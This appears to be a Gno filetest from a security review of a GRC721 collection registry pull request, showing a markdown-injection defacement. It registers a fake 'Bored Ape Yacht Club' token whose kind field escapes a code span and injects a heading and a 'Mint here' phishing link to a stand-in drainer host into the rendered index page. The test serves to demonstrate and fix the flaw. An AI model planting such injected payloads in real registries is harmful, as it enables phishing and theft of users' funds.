/* Run: from a gno checkout, green at 42278bdce; the golden below is what the registry page renders:
gh pr checkout 6075 -R gnolang/gno && git checkout 42278bdce
P=examples/gno.land/r/demo/zprobe75
mkdir -p $P
printf 'module = "gno.land/r/demo/zprobe75"\ngno = "0.9"\n' > $P/gnomod.toml
curl -fsSL -o $P/deface_filetest.gno https://raw.githubusercontent.com/samouraiworld/gno-agent-workspace/main/reviews/pr/6xxx/6075-grc721reg-collection-registry/1-42278bdce/tests/render_defacement_filetest.gno
cd $P && gno test -v .
cd - && rm -r $P
*/

// PKGPATH: gno.land/r/demo/zdeface
package zdeface

import (
	"gno.land/p/demo/tokens/grc721"
	"gno.land/r/demo/defi/grc721reg"
)

type view struct{ kind, id string }

func (v *view) ExtensionKind() string { return v.kind }
func (v *view) TokenID() string       { return v.id }

func main(cur realm) {
	tok, _ := grc721.NewToken("Bored Ape Yacht Club", "SCAM", 0, cur)

	key := grc721reg.Register(cross(cur), tok, "BAYC", &view{
		kind: "x`\n\n# Official collection\n\n[Mint here](https://evil.example/drain)\n\n`",
		id:   tok.ID(),
	})

	println("index page:")
	println(grc721reg.Render(""))
	println("key:", key)
}

// Output:
// index page:
// - **Bored Ape Yacht Club** - [gno.land/r/demo/zdeface](/r/demo/zdeface).BAYC - `x`
//
// # Official collection
//
// [Mint here](https://evil.example/drain)
//
// `` - [info](/r/demo/defi/grc721reg:gno.land/r/demo/zdeface.BAYC)
//
// key: gno.land/r/demo/zdeface.BAYC
